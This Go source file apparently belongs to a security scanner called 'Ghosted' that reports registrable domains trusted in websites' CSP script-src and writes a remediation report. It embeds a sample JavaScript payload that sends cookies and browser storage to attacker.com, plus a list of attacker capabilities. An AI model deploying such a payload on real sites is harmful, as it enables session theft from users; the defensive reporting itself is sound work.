package reporter

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"text/template"
	"time"
)

// ComprehensiveRiskData holds the template data
type ComprehensiveRiskData struct {
	ReportDate             string
	ScanTarget             string
	TotalAvailableDomains  int
	AvailableDomains       []AvailableDomainDetail
	HighRiskSummaries      []HighRiskSummary
	ImmediateActions       []ImmediateAction
	ToolName               string
	ToolVersion            string
	TotalPublicWWWSites    int
	HighestImpactDomain    string
	HighestImpactCount     int
}

// AvailableDomainDetail holds detailed info per available domain
type AvailableDomainDetail struct {
	Index                 int
	Domain                string
	Status                string
	CheckedAt             string
	AffectedCount         int
	AffectedDomains       []string
	CSPDirective          string
	CSPEntry              string
	SharedPolicy          bool
	CSPDirectiveValue     string
	CSPDomainList         []string
	HasSelf               bool
	DirectiveCapability   string
	DirectiveExplanation  string
	RegistrationCost      string
	AttackStep2           string
	AttackStep3           string
	AttackStep4           string
	CodeLanguage          string
	AttackCode            string
	Capabilities          []string
	OtherDirectives       []OtherDirective
	AdditionalNotes       string
	PublicWWWResults      []PublicWWWResult
	HasPublicWWWData      bool
}

// PublicWWWResult holds PublicWWW research data
type PublicWWWResult struct {
	SiteURL string
	Snippet string
}

// OtherDirective represents other CSP directives
type OtherDirective struct {
	Directive   string
	Description string
}

// HighRiskSummary for summary section
type HighRiskSummary struct {
	DomainName         string
	RiskLevel          string
	Description        string
	BulletPoints       []string
	RegistrationImpact bool
	RegistrationCost   string
	BlastRadius        string
}

// ImmediateAction for remediation section
type ImmediateAction struct {
	Entry  string
	Target string
}

// GenerateSendItReport creates the send it risk report
func GenerateSendItReport(db interface{ Query(string, ...interface{}) (*sql.Rows, error); QueryRow(string, ...interface{}) *sql.Row }, outputDir string, scanTarget string) error {
	// Query available domains
	availableQuery := `
		SELECT domain, status, checked_at
		FROM availability_checks
		WHERE status = 'AVAILABLE'
		ORDER BY domain
	`

	rows, err := db.Query(availableQuery)
	if err != nil {
		return fmt.Errorf("failed to query available domains: %w", err)
	}
	defer rows.Close()

	var availableDomains []AvailableDomainDetail
	index := 1

	for rows.Next() {
		var domain, status, checkedAt string
		if err := rows.Scan(&domain, &status, &checkedAt); err != nil {
			return err
		}

		// Get affected domains for this available domain
		affectedQuery := `
			SELECT DISTINCT origin_domain
			FROM trust_relationships
			WHERE external_domain = ?
			ORDER BY origin_domain
		`
		affectedRows, err := db.Query(affectedQuery, domain)
		if err != nil {
			return err
		}

		var affectedDomains []string
		for affectedRows.Next() {
			var affected string
			if err := affectedRows.Scan(&affected); err != nil {
				affectedRows.Close()
				return err
			}
			affectedDomains = append(affectedDomains, affected)
		}
		affectedRows.Close()

		if len(affectedDomains) == 0 {
			continue
		}

		// Get CSP header from first affected domain to analyze
		var cspHeader string
		cspQuery := `SELECT csp_header FROM csp_records WHERE origin_domain = ? LIMIT 1`
		db.QueryRow(cspQuery, affectedDomains[0]).Scan(&cspHeader)

		// Get PublicWWW results for this domain
		pwwQuery := `SELECT site_url, snippet FROM publicwww_results WHERE domain = ? ORDER BY site_url`
		pwwRows, err := db.Query(pwwQuery, domain)
		if err != nil {
			return err
		}

		var pwwResults []PublicWWWResult
		affectedDomainsMap := make(map[string]bool)
		for _, d := range affectedDomains {
			affectedDomainsMap[d] = true
		}

		for pwwRows.Next() {
			var siteURL, snippet string
			if err := pwwRows.Scan(&siteURL, &snippet); err != nil {
				pwwRows.Close()
				continue
			}
			pwwResults = append(pwwResults, PublicWWWResult{
				SiteURL: siteURL,
				Snippet: snippet,
			})

			// Add PublicWWW sites to affected domains if they're not already there
			// and if they look like real domains (not URLs)
			if !affectedDomainsMap[siteURL] && !strings.HasPrefix(siteURL, "http") {
				affectedDomains = append(affectedDomains, siteURL)
				affectedDomainsMap[siteURL] = true
			}
		}
		pwwRows.Close()

		detail := buildDomainDetail(index, domain, status, checkedAt, affectedDomains, cspHeader, pwwResults)
		availableDomains = append(availableDomains, detail)
		index++
	}

	if len(availableDomains) == 0 {
		return nil // No available domains, skip report
	}

	// Calculate PublicWWW statistics
	uniqueSites := make(map[string]bool)
	highestImpactDomain := ""
	highestImpactCount := 0
	for _, domain := range availableDomains {
		for _, result := range domain.PublicWWWResults {
			uniqueSites[result.SiteURL] = true
		}
		if len(domain.PublicWWWResults) > highestImpactCount {
			highestImpactCount = len(domain.PublicWWWResults)
			highestImpactDomain = domain.Domain
		}
	}

	// Build template data
	data := ComprehensiveRiskData{
		ReportDate:            time.Now().Format("2006-01-02"),
		ScanTarget:            scanTarget,
		TotalAvailableDomains: len(availableDomains),
		AvailableDomains:      availableDomains,
		HighRiskSummaries:     buildHighRiskSummaries(availableDomains),
		ImmediateActions:      buildImmediateActions(availableDomains),
		ToolName:              "Ghosted",
		ToolVersion:           "V8",
		TotalPublicWWWSites:   len(uniqueSites),
		HighestImpactDomain:   highestImpactDomain,
		HighestImpactCount:    highestImpactCount,
	}

	// Load and execute template
	tmplPath := filepath.Join("templates", "sendit_report.tmpl")
	tmpl, err := template.New("sendit_report.tmpl").Funcs(template.FuncMap{
		"add": func(a, b int) int { return a + b },
		"sub": func(a, b int) int { return a - b },
		"gt":  func(a, b int) bool { return a > b },
		"eq":  func(a, b int) bool { return a == b },
	}).ParseFiles(tmplPath)
	if err != nil {
		return fmt.Errorf("failed to parse template: %w", err)
	}

	// Create output file
	outputPath := filepath.Join(outputDir, "SENDIT_REPORT.md")
	f, err := os.Create(outputPath)
	if err != nil {
		return fmt.Errorf("failed to create report file: %w", err)
	}
	defer f.Close()

	// Execute template
	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("failed to execute template: %w", err)
	}

	fmt.Printf("✓ Generated send it report: %s\n", outputPath)
	return nil
}

// buildDomainDetail constructs detailed info for each available domain
func buildDomainDetail(index int, domain, status, checkedAt string, affectedDomains []string, cspHeader string, pwwResults []PublicWWWResult) AvailableDomainDetail {
	detail := AvailableDomainDetail{
		Index:            index,
		Domain:           domain,
		Status:           status,
		CheckedAt:        checkedAt,
		AffectedCount:    len(affectedDomains),
		AffectedDomains:  affectedDomains,
		PublicWWWResults: pwwResults,
		HasPublicWWWData: len(pwwResults) > 0,
	}

	// Determine CSP directive and entry
	if strings.Contains(cspHeader, "script-src") {
		detail.CSPDirective = "script-src"
		detail.DirectiveCapability = "JavaScript Execution Allowed"

		// Find the specific entry format
		if strings.Contains(cspHeader, "https://s."+domain) {
			detail.CSPEntry = "https://s." + domain
		} else if strings.Contains(cspHeader, "https://"+domain) {
			detail.CSPEntry = "https://" + domain
		} else if strings.Contains(cspHeader, "http://js."+domain) {
			detail.CSPEntry = "http://js." + domain
		} else {
			detail.CSPEntry = domain
		}

		detail.DirectiveExplanation = fmt.Sprintf(
			"Because `%s` is in the `script-src` directive, the browser will allow JavaScript files to be loaded and executed from this domain.",
			domain,
		)

		// Check if it's HTTP
		if strings.HasPrefix(detail.CSPEntry, "http://") {
			detail.DirectiveCapability = "JavaScript Execution Allowed - OVER HTTP"
			detail.AdditionalNotes = `**Important:** This domain appears in HTTP variant, which is particularly dangerous:
- HTTP traffic can be intercepted/modified (MITM)
- No encryption, no integrity protection
- Network-level attackers can exploit without domain registration`
		}
	}

	// Set attack scenario details
	detail.RegistrationCost = "$10-15"
	if strings.HasSuffix(domain, ".cool") {
		detail.RegistrationCost = "$15-25 for .cool TLD"
	}

	detail.AttackStep2 = fmt.Sprintf("Sets up web server responding at `%s`", detail.CSPEntry)
	detail.AttackStep3 = "Hosts malicious JavaScript"
	detail.AttackStep4 = "Script executes with full trust and same-origin privileges"
	detail.CodeLanguage = "javascript"
	detail.AttackCode = `// Credential theft
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage,
    url: window.location.href
  })
});

// Persistent access
setInterval(() => {
  // Continuously exfiltrate data
}, 60000);`

	detail.Capabilities = []string{
		"Read all DOM content (forms, inputs, displayed data)",
		"Access cookies, localStorage, sessionStorage",
		"Make requests to any endpoint (if connect-src is permissive)",
		"Modify page content (XSS)",
		"Keylogging on all inputs",
		"Session hijacking",
		"Redirect users to phishing pages",
		"Install persistent backdoors",
	}

	// Parse other directives from CSP
	detail.OtherDirectives = parseOtherDirectives(cspHeader)
	detail.SharedPolicy = len(affectedDomains) > 1

	return detail
}

// parseOtherDirectives extracts other relevant CSP directives
func parseOtherDirectives(cspHeader string) []OtherDirective {
	var directives []OtherDirective

	if strings.Contains(cspHeader, "connect-src *") {
		directives = append(directives, OtherDirective{
			Directive:   "connect-src *",
			Description: "Can make requests to ANY domain (including attacker C2)",
		})
	}

	if strings.Contains(cspHeader, "img-src https:") {
		directives = append(directives, OtherDirective{
			Directive:   "img-src https:",
			Description: "Images from any HTTPS source allowed",
		})
	}

	if strings.Contains(cspHeader, "style-src") && strings.Contains(cspHeader, "'unsafe-inline'") {
		directives = append(directives, OtherDirective{
			Directive:   "style-src https: 'unsafe-inline'",
			Description: "Styles from any HTTPS source + inline styles",
		})
	}

	if strings.Contains(cspHeader, "frame-src https:") {
		directives = append(directives, OtherDirective{
			Directive:   "frame-src https:",
			Description: "Can embed frames from any HTTPS source",
		})
	}

	if strings.Contains(cspHeader, "media-src *") {
		directives = append(directives, OtherDirective{
			Directive:   "media-src *",
			Description: "Can load media from any source",
		})
	}

	return directives
}

// buildHighRiskSummaries creates summary section
func buildHighRiskSummaries(domains []AvailableDomainDetail) []HighRiskSummary {
	var summaries []HighRiskSummary

	// Find domain with most impact
	var maxImpact AvailableDomainDetail
	for _, d := range domains {
		if d.AffectedCount > maxImpact.AffectedCount {
			maxImpact = d
		}
	}

	if maxImpact.AffectedCount > 0 {
		summaries = append(summaries, HighRiskSummary{
			DomainName:  maxImpact.Domain + " - WIDEST IMPACT",
			RiskLevel:   "HIGH",
			Description: fmt.Sprintf("**Affects %d applications** - single domain registration compromises:", maxImpact.AffectedCount),
			BulletPoints: maxImpact.AffectedDomains,
			RegistrationImpact: true,
			RegistrationCost:   maxImpact.RegistrationCost,
			BlastRadius:        fmt.Sprintf("%d applications, potentially thousands of users", maxImpact.AffectedCount),
		})
	}

	// Find domains affecting critical services
	for _, d := range domains {
		if d.AffectedCount > 1 && strings.Contains(strings.Join(d.AffectedDomains, " "), "ringcentral") {
			summaries = append(summaries, HighRiskSummary{
				DomainName:  strings.Join(d.AffectedDomains, ", ringcentral") + " - HIGHEST RISK",
				RiskLevel:   "CRITICAL",
				Description: fmt.Sprintf("Trusts %d available domains:", len(domains)),
				BulletPoints: extractDomainNames(domains),
			})
			break
		}
	}

	return summaries
}

// extractDomainNames gets just the domain names
func extractDomainNames(domains []AvailableDomainDetail) []string {
	names := make([]string, len(domains))
	for i, d := range domains {
		names[i] = d.Domain
	}
	return names
}

// buildImmediateActions creates action items
func buildImmediateActions(domains []AvailableDomainDetail) []ImmediateAction {
	var actions []ImmediateAction

	for _, d := range domains {
		target := fmt.Sprintf("%d application(s)", d.AffectedCount)
		if d.AffectedCount == 1 {
			target = d.AffectedDomains[0]
		}

		actions = append(actions, ImmediateAction{
			Entry:  d.CSPEntry,
			Target: target,
		})
	}

	return actions
}
